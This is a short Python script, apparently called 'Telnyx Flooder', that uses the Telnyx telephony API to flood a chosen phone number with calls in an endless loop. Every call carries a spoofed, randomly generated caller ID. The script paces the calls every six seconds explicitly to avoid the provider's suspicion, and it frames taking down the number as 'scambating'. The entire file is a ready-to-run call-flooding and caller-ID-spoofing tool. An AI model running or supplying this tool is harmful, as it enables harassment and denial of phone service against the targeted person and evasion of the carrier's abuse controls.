import telnyx
import random
import time
telnyx.api_key = "YOUR_API_KEY" # Put your API Key here
control_id = "YOUR_CALL_CONTROL_APP_ID" # Put Your Call Control App's ID Here
area_codes = ["718", "415", "888", "833", "907", "808"]
print(r"""
$$$$$$$$\        $$\                                     $$$$$$$$\ $$\                           $$\                     
\__$$  __|       $$ |                                    $$  _____|$$ |                          $$ |                    
   $$ | $$$$$$\  $$ |$$$$$$$\  $$\   $$\ $$\   $$\       $$ |      $$ | $$$$$$\   $$$$$$\   $$$$$$$ | $$$$$$\   $$$$$$\  
   $$ |$$  __$$\ $$ |$$  __$$\ $$ |  $$ |\$$\ $$  |      $$$$$\    $$ |$$  __$$\ $$  __$$\ $$  __$$ |$$  __$$\ $$  __$$\ 
   $$ |$$$$$$$$ |$$ |$$ |  $$ |$$ |  $$ | \$$$$  /       $$  __|   $$ |$$ /  $$ |$$ /  $$ |$$ /  $$ |$$$$$$$$ |$$ |  \__|
   $$ |$$   ____|$$ |$$ |  $$ |$$ |  $$ | $$  $$<        $$ |      $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$   ____|$$ |      
   $$ |\$$$$$$$\ $$ |$$ |  $$ |\$$$$$$$ |$$  /\$$\       $$ |      $$ |\$$$$$$  |\$$$$$$  |\$$$$$$$ |\$$$$$$$\ $$ |      
   \__| \_______|\__|\__|  \__| \____$$ |\__/  \__|      \__|      \__| \______/  \______/  \_______| \_______|\__|      
                               $$\   $$ |                                                                                
                               \$$$$$$  |                                                                                
                                \______/                                                                                 
""")
print("Don't forget to input your call control ID and API Key in the python file! You must have money in your Telnyx account of course.")
number = input("What number do you want to take down? Please include the country code at the beginning(e.g +1) ")
input("Are you sure you want to flood this number?")
flood_amount = 0
print("To prevent Telnyx from being suspicious, A call will be placed every 6 seconds. Press Ctrl-C to cancel the flood at any time. Happy scambating!")
while True:
    flood_amount += 1
    area_code = random.choice(area_codes)
    caller_id = random.randrange(3000000, 9000000)
    print(f"FLOOD: {flood_amount} CALLING: {number} FROM: {area_code}{caller_id}")
    telnyx.Call.create(connection_id=control_id, to=number, from_=f"+1{area_code}{caller_id}")
    time.sleep(6)

